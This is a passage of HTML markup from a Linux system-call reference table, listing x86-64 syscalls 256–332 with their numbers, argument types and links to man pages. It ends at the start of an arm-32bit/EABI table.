href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td><td align="center">0x100</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td align="center">257</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x101</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">258</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x102</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">259</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x103</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">260</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x104</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">261</td><td>futimesat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td><td align="center">0x105</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>newfstatat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/newfstatat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*newfstatat">cs/</a></td><td align="center">0x106</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x107</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">264</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x108</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">265</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x109</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">266</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x10a</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x10b</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x10c</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x10d</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x10e</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">271</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x10f</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">272</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x110</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">273</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x111</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">274</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x112</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">275</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x113</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">276</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x114</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">277</td><td>sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td><td align="center">0x115</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">278</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x116</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0x117</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">280</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x118</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">281</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x119</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">282</td><td>signalfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td><td align="center">0x11a</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x11b</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>eventfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td><td align="center">0x11c</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">285</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x11d</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">286</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x11e</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">287</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x11f</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">288</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0x120</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">289</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x121</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x122</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">291</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x123</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">292</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x124</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">293</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x125</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">294</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x126</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">295</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x127</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">296</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x128</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">297</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0x129</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">298</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0x12a</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">299</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0x12b</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">300</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x12c</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">301</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x12d</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">302</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x12e</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">303</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x12f</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">304</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x130</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">305</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x131</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">306</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x132</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">307</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x133</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">308</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x134</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">309</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0x135</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">310</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x136</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">311</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x137</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">312</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x138</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">313</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x139</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">314</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x13a</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">315</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x13b</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">316</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x13c</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">317</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x13d</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">318</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x13e</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">319</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x13f</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">320</td><td>kexec_file_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_file_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_file_load">cs/</a></td><td align="center">0x140</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char *cmdline_ptr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">321</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x141</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">322</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x142</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">323</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x143</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">324</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x144</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">325</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x145</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">326</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x146</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">327</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x147</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">328</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x148</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">329</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x149</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">330</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x14a</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">331</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x14b</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">332</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x14c</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr></tbody></table><h1 id="0x3-arm-32bit-EABI"><a href="#0x3-arm-32bit-EABI" class="headerlink" title="0x3 arm-32bit/EABI"></a>0x3 arm-32bit/EABI</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%r7</th><th>arg0 (%r0)</th><th>arg1 (%r1)</th><th>arg2 (%r2)</th><th>arg3 (%r3)</th><th>arg4 (%r4)</th><th>arg5 (%r5)</th></tr></thead><tbody><tr><td align="center">0</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a 